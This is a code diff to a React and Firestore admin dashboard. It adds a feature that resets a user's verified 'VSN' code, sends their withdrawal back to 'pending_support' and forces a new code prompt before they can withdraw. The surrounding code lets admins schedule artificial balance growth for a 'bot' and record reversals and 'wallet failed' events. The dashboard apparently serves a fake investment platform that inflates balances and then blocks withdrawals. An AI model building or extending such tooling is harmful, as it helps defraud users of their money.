@@ -160,6 +160,12 @@ export default function AdminDashboard() {
   const [vsnOk, setVsnOk] = useState("");
   const [vsnErr, setVsnErr] = useState("");
 
+  // ── NEW: Unverify VSN states ──
+  const [unverifySel, setUnverifySel] = useState(null);
+  const [unverifyLoading, setUnverifyLoading] = useState(false);
+  const [unverifyOk, setUnverifyOk] = useState("");
+  const [unverifyErr, setUnverifyErr] = useState("");
+
   const [nowMs, setNowMs] = useState(() => Date.now());
   useEffect(() => {
     const id = setInterval(() => setNowMs(Date.now()), 60_000);
@@ -229,6 +235,9 @@ export default function AdminDashboard() {
       setVsnSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
       setWfSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
       setRevSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
+      setUnverifySel((p) =>
+        p ? list.find((u) => u.uid === p.uid) || p : null,
+      );
     });
     return () => unsub();
   }, [adminUser]);
@@ -326,9 +335,6 @@ export default function AdminDashboard() {
                 balanceBefore: currentBalance,
                 balanceAfter: newBalance,
               });
-              console.log(
-                `Reversal executed: $${fmt(rev.amount)} for ${rev.userEmail}`,
-              );
             } catch (e) {
               console.error("Reversal execution error:", e);
               try {
@@ -468,6 +474,7 @@ export default function AdminDashboard() {
       setFundLoading(false);
     }
   };
+
   const generateIncrementSchedule = (targetAmount, totalHours) => {
     if (!targetAmount || targetAmount <= 0 || !totalHours || totalHours <= 0)
       return [];
@@ -523,7 +530,6 @@ export default function AdminDashboard() {
     const hours = Math.max(0, parseInt(botHrs) || 0);
     const mins = Math.max(0, parseInt(botMins) || 0);
     const totalMs = hours * 3600000 + mins * 60000;
-
     if (!tgtSel) {
       setTgtErr("Select a user.");
       return;
@@ -540,29 +546,22 @@ export default function AdminDashboard() {
       setTgtErr("Set a duration of at least 1 minute.");
       return;
     }
-
     const now = Timestamp.now();
     const anaExpMs = tgtSel.analysingExpiresAt?.toMillis?.() || 0;
     const botExpMs =
       tgtSel.botExpiresAt?.toMillis?.() || tgtSel.botExpiresAt || 0;
-
-    // Bot is in analysing/scheduled phase (never activated yet, or pending)
     const isAnalysing =
       !botExpMs &&
       (tgtSel.botStatus === "analysing" ||
         tgtSel.botStatus === "scheduled" ||
         (anaExpMs && Date.now() < anaExpMs));
-
     setTgtLoading(true);
     setTgtErr("");
     setTgtOk("");
-
     try {
       const userRef = doc(db, "users", tgtSel.uid);
       const currentBalance = tgtSel.balance || 0;
-
       if (isAnalysing) {
-        // Schedule — will auto-activate after analysing finishes
         await updateDoc(userRef, {
           targetAmount: target,
           botHours: hours + mins / 60,
@@ -592,7 +591,6 @@ export default function AdminDashboard() {
           `Scheduled! $${fmt(currentBalance)} → $${fmt(currentBalance + target)} over ${hours}h ${mins}m.`,
         );
       } else {
-        // Direct activation — works for first activation AND re-activation after expiry
         const botExpiresAt = Timestamp.fromMillis(now.toMillis() + totalMs);
         await updateDoc(userRef, {
           targetAmount: target,
@@ -630,7 +628,6 @@ export default function AdminDashboard() {
           `Bot activated! $${fmt(currentBalance)} → $${fmt(currentBalance + target)} over ${hours}h ${mins}m.`,
         );
       }
-
       setTgtAmt("");
       setBotHrs("1");
       setBotMins("0");
@@ -906,6 +903,58 @@ export default function AdminDashboard() {
     }
   };
 
+  // ── NEW: Unverify VSN handler ──
+  // Resets a verified user's VSN status so they must enter a new code.
+  // The admin can then generate a fresh VSN for that user via the Generate VSN section.
+  const handleUnverifyVSN = async () => {
+    if (!unverifySel) {
+      setUnverifyErr("Select a verified user to unverify.");
+      return;
+    }
+    if (!unverifySel.vsn_verified) {
+      setUnverifyErr("This user's VSN is not currently verified.");
+      return;
+    }
+    setUnverifyLoading(true);
+    setUnverifyErr("");
+    setUnverifyOk("");
+    try {
+      const now = Timestamp.now();
+      await updateDoc(doc(db, "users", unverifySel.uid), {
+        vsn_verified: false,
+        vsn_required: true, // prompts the VSN modal in the user's withdrawal tab
+        vsn_code: "", // old code wiped — admin must generate a new one
+        vsn_unverified_at: now,
+        // Reset withdrawal status so they go through the VSN flow again
+        withdrawalStatus: "pending_support",
+      });
+      await setDoc(doc(collection(db, "adminTransactions")), {
+        userId: unverifySel.uid,
+        userEmail: unverifySel.email,
+        userName:
+          `${unverifySel.firstName} ${unverifySel.lastName}`.trim() ||
+          unverifySel.username,
+        type: "vsn_unverify",
+        timestamp: now,
+        status: "pending",
+        adminEmail: adminUser.email,
+        note: "VSN reset by admin — user must enter a new VSN code",
+      });
+      setUnverifyOk(
+        `VSN reset for ${unverifySel.email}. Old code expired. Now generate a new VSN code for them below.`,
+      );
+      // Pre-select this user in the Generate VSN section so admin can immediately issue a new code
+      setVsnSel(unverifySel);
+      setUnverifySel(null);
+      setTimeout(() => setUnverifyOk(""), 10000);
+    } catch (e) {
+      console.error(e);
+      setUnverifyErr("Failed to reset VSN. Try again.");
+    } finally {
+      setUnverifyLoading(false);
+    }
+  };
+
   const getBotStatus = (u) => {
     if (!u.hasBeenFunded)
       return { text: "Not Funded", color: "#6b7280", dot: "#6b7280" };
@@ -1049,6 +1098,11 @@ export default function AdminDashboard() {
     setRevErr("");
     setRevOk("");
   };
+  const clearUnverify = () => {
+    setUnverifySel(null);
+    setUnverifyErr("");
+    setUnverifyOk("");
+  };
 
   const txnRows = useMemo(() => {
     return visibleTxns.map((t) => {
@@ -1084,13 +1138,20 @@ export default function AdminDashboard() {
                       text: "#22c55e",
                       label: "Reversal",
                     }
-                  : STATUS_COLORS[ls] || STATUS_COLORS.completed;
+                  : t.type === "vsn_unverify"
+                    ? {
+                        bg: "rgba(239,68,68,0.15)",
+                        text: "#ef4444",
+                        label: "VSN Reset",
+                      }
+                    : STATUS_COLORS[ls] || STATUS_COLORS.completed;
 
       let typeLabel = t.type;
       if (t.type === "wallet_failed") typeLabel = "Wallet Failed";
       else if (t.type === "withdrawal_success") typeLabel = "Withdrawal";
       else if (t.type === "vsn_deposit") typeLabel = "VSN Deposit";
       else if (t.type === "reversal") typeLabel = "Reversal";
+      else if (t.type === "vsn_unverify") typeLabel = "VSN Reset";
       else if (t.type === "vsn_request")
         typeLabel =
           ls === "completed"
@@ -1131,7 +1192,9 @@ export default function AdminDashboard() {
             </span>
           </td>
           <td data-label="Amount" className="amount">
-            {t.type === "vsn_request" || t.type === "wallet_failed" ? (
+            {t.type === "vsn_request" ||
+            t.type === "wallet_failed" ||
+            t.type === "vsn_unverify" ? (
               <span style={{ color: "#6b7280" }}>—</span>
             ) : t.type === "withdrawal_success" ? (
               <span style={{ color: "#ef4444" }}>-${fmt(t.amount || 0)}</span>
@@ -1149,6 +1212,10 @@ export default function AdminDashboard() {
                 }}
               >
                 {t.note || "Wallet connection failed"}
+              </span>
+            ) : t.type === "vsn_unverify" ? (
+              <span style={{ color: "#ef4444", fontSize: "11px" }}>
+                VSN code expired
               </span>
             ) : t.type === "withdrawal_success" ? (
               <span style={{ color: "#9ca3af", fontSize: "11px" }}>
@@ -1230,6 +1297,8 @@ export default function AdminDashboard() {
   );
   const vsnPending = users.filter((u) => u.vsn_required && !u.vsn_verified);
   const vsnVerified = users.filter((u) => u.vsn_verified);
+  // ── NEW: users eligible to be unverified ──
+  const vsnVerifiedUsers = users.filter((u) => u.vsn_verified);
   const walletFailedUsers = users.filter((u) => u.walletConnectionFailed);
   const withdrawalSuccessUsers = users.filter(
     (u) => u.lastWithdrawnAmount > 0 || u.withdrawalCompletedCount > 0,
@@ -1300,6 +1369,7 @@ export default function AdminDashboard() {
               clearWf();
               clearProc();
               clearRev();
+              clearUnverify();
               setView("main");
             }}
           >
@@ -1432,6 +1502,7 @@ export default function AdminDashboard() {
     </header>
   );
 
+  // ─────────────────── PROCESSING VIEW ───────────────────
   if (view === "processing") {
     return (
       <div className="admin-dashboard">
@@ -1712,6 +1783,7 @@ export default function AdminDashboard() {
     );
   }
 
+  // ─────────────────── REVERSAL VIEW ───────────────────
   if (view === "reversal") {
     return (
       <div className="admin-dashboard">
@@ -2003,6 +2075,7 @@ export default function AdminDashboard() {
     );
   }
 
+  // ─────────────────── WALLET FAILED VIEW ───────────────────
   if (view === "wallet_failed") {
     return (
       <div className="admin-dashboard">
@@ -2223,6 +2296,7 @@ export default function AdminDashboard() {
     );
   }
 
+  // ─────────────────── VSN VIEW ───────────────────
   if (view === "vsn") {
     return (
       <div className="admin-dashboard">
@@ -2241,6 +2315,7 @@ export default function AdminDashboard() {
           </div>
         )}
         <div className="sub-page-wrap">
+          {/* ── CARD: Deposit to User (VSN) ── */}
           <div className="card">
             <div className="card-header">
               <span className="card-badge" style={{ background: "#22c55e" }}>
@@ -2373,6 +2448,257 @@ export default function AdminDashboard() {
             </div>
           </div>
 
+          {/* ── NEW CARD: Unverify / Reset VSN ── */}
+          <div className="card">
+            <div className="card-header">
+              <span
+                className="card-badge"
+                style={{
+                  background: "linear-gradient(135deg,#ef4444,#b91c1c)",
+                }}
+              >
+                ↺
+              </span>
+              <h2 className="card-title">Unverify / Reset VSN</h2>
+            </div>
+            <div
+              className="info-banner"
+              style={{
+                background: "rgba(239,68,68,0.08)",
+                border: "1px solid rgba(239,68,68,0.2)",
+                borderRadius: "10px",
+                padding: "12px 16px",
+                marginBottom: "18px",
+              }}
+            >
+              <p className="info-banner-title" style={{ color: "#ef4444" }}>
+                How this works
+              </p>
+              <p className="info-banner-body">
+                Select a currently{" "}
+                <strong style={{ color: "#fff" }}>VSN-verified</strong> user.
+                Clicking Reset will:
+                <br />• Expire their old VSN code immediately
+                <br />• Set their withdrawal status back to{" "}
+                <strong style={{ color: "#fff" }}>pending_support</strong>
+                <br />• Force the VSN entry modal to appear again when they try
+                to withdraw
+                <br />• Pre-select them in the Generate VSN section below so you
+                can instantly issue a new code
+              </p>
+            </div>
+            <div className="stats-row">
+              {[
+                {
+                  label: "VSN Verified Users",
+                  value: vsnVerifiedUsers.length,
+                  color: "#22c55e",
+                  bg: "rgba(34,197,94,0.1)",
+                },
+                {
+                  label: "VSN Pending",
+                  value: vsnPending.length,
+                  color: "#f59e0b",
+                  bg: "rgba(245,158,11,0.1)",
+                },
+              ].map((s) => (
+                <div
+                  key={s.label}
+                  className="stat-box"
+                  style={{ background: s.bg }}
+                >
+                  <p className="stat-value" style={{ color: s.color }}>
+                    {s.value}
+                  </p>
+                  <p className="stat-label">{s.label}</p>
+                </div>
+              ))}
+            </div>
+            <div className="form-group">
+              <label className="form-label">
+                Select Verified User to Reset
+              </label>
+              <select
+                className="form-select"
+                value={unverifySel?.uid || ""}
+                onChange={(e) => {
+                  setUnverifySel(
+                    users.find((u) => u.uid === e.target.value) || null,
+                  );
+                  setUnverifyErr("");
+                }}
+              >
+                <option value="">Choose a VSN-verified user...</option>
+                {vsnVerifiedUsers.map((u) => (
+                  <option key={u.uid} value={u.uid}>
+                    {u.email} — Balance: ${fmt(u.balance)} — ✓ Verified
+                  </option>
+                ))}
+              </select>
+            </div>
+            {unverifySel && (
+              <div
+                className="info-box"
+                style={{
+                  borderColor: "rgba(239,68,68,0.25)",
+                  background: "rgba(239,68,68,0.05)",
+                }}
+              >
+                <p className="info-row">
+                  Email: <strong>{unverifySel.email}</strong>
+                </p>
+                <p className="info-row">
+                  Balance: <strong>${fmt(unverifySel.balance)}</strong>
+                </p>
+                <p className="info-row">
+                  Current VSN Status:{" "}
+                  <strong style={{ color: "#22c55e" }}>✓ Verified</strong>
+                </p>
+                <p className="info-row">
+                  After reset:{" "}
+                  <strong style={{ color: "#ef4444" }}>
+                    VSN required — user will see "Enter VSN Code" modal on next
+                    withdrawal
+                  </strong>
+                </p>
+              </div>
+            )}
+            {unverifyErr && (
+              <div className="alert alert-error">{unverifyErr}</div>
+            )}
+            {unverifyOk && (
+              <div
+                className="alert alert-success"
+                style={{
+                  background: "rgba(245,158,11,0.1)",
+                  border: "1px solid rgba(245,158,11,0.3)",
+                  color: "#fbbf24",
+                }}
+              >
+                {unverifyOk}
+              </div>
+            )}
+            <div className="btn-group">
+              <button
+                className="btn-primary"
+                onClick={handleUnverifyVSN}
+                disabled={unverifyLoading || !unverifySel}
+                style={{
+                  background: unverifySel
+                    ? "linear-gradient(135deg,#ef4444,#b91c1c)"
+                    : undefined,
+                  border: "none",
+                }}
+              >
+                {unverifyLoading ? (
+                  <>
+                    <span className="spinner" /> Resetting...
+                  </>
+                ) : (
+                  <>
+                    <svg
+                      width="13"
+                      height="13"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2.5"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <polyline points="1 4 1 10 7 10" />
+                      <path d="M3.51 15a9 9 0 1 0 .49-3.46" />
+                    </svg>{" "}
+                    Reset VSN — Require New Code
+                  </>
+                )}
+              </button>
+              <button className="btn-secondary" onClick={clearUnverify}>
+                Clear
+              </button>
+            </div>
+            {/* Table of verified users for quick selection */}
+            {vsnVerifiedUsers.length > 0 && (
+              <div style={{ marginTop: "20px" }}>
+                <p
+                  style={{
+                    color: "#6b7280",
+                    fontSize: "12px",
+                    marginBottom: "10px",
+                    fontWeight: 600,
+                    textTransform: "uppercase",
+                    letterSpacing: "0.05em",
+                  }}
+                >
+                  Verified Users — click to select
+                </p>
+                <div className="table-wrap">
+                  <table className="admin-table">
+                    <thead>
+                      <tr>
+                        {["User", "Balance", "VSN Code", "Action"].map((h) => (
+                          <th key={h}>{h}</th>
+                        ))}
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {vsnVerifiedUsers.map((u) => (
+                        <tr
+                          key={u.uid}
+                          onClick={() => {
+                            setUnverifySel(u);
+                            setUnverifyErr("");
+                          }}
+                          style={{ cursor: "pointer" }}
+                        >
+                          <td data-label="User">
+                            <p
+                              style={{
+                                color: "#fff",
+                                fontSize: "12px",
+                                fontWeight: 600,
+                                margin: 0,
+                              }}
+                            >
+                              {u.email}
+                            </p>
+                            <p
+                              style={{
+                                color: "#6b7280",
+                                fontSize: "10px",
+                                margin: 0,
+                              }}
+                            >
+                              @{u.username || "—"}
+                            </p>
+                          </td>
+                          <td data-label="Balance" className="amount">
+                            ${fmt(u.balance)}
+                          </td>
+                          <td data-label="VSN Code">
+                            <span
+                              style={{
+                                color: "#6b7280",
+                                fontSize: "11px",
+                                fontStyle: "italic",
+                              }}
+                            >
+                              {u.vsn_code ? "•••••••" : "—"}
+                            </span>
+                          </td>
+                          <td data-label="Action">
+                            <span className="pill pill-green">Verified ✓</span>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* ── CARD: Generate VSN Code ── */}
           <div className="card">
             <div className="card-header">
               <span className="card-badge" style={{ background: "#7C5CFC" }}>
@@ -2386,6 +2712,7 @@ export default function AdminDashboard() {
               </p>
               <p className="info-banner-body">
                 Generate a VSN code for a user who has contacted support.
+                {unverifyOk && " The user selected above has been pre-filled."}
               </p>
             </div>
             <div className="stats-row stats-row-3">
@@ -2420,6 +2747,32 @@ export default function AdminDashboard() {
                   <p className="stat-label">{s.label}</p>
                 </div>
               ))}
+            </div>
+            <div className="form-group">
+              <label className="form-label">Select User</label>
+              <select
+                className="form-select"
+                value={vsnSel?.uid || ""}
+                onChange={(e) => {
+                  setVsnSel(
+                    users.find((u) => u.uid === e.target.value) || null,
+                  );
+                  setVsnErr("");
+                  setVsnDepositErr("");
+                }}
+              >
+                <option value="">Choose a user...</option>
+                {users.map((u) => (
+                  <option key={u.uid} value={u.uid}>
+                    {u.email} — ${fmt(u.balance)}
+                    {u.withdrawalStatus === "pending_support"
+                      ? " Withdrawal Pending"
+                      : ""}
+                    {u.vsn_required && !u.vsn_verified ? " • VSN Required" : ""}
+                    {u.vsn_verified ? " • Verified" : ""}
+                  </option>
+                ))}
+              </select>
             </div>
             {vsnSel && (
               <div className="info-box">
@@ -2603,6 +2956,7 @@ export default function AdminDashboard() {
     );
   }
 
+  // ─────────────────── MAIN VIEW ───────────────────
   return (
     <div className="admin-dashboard">
       <AdminHeader title="Admin Dashboard" />
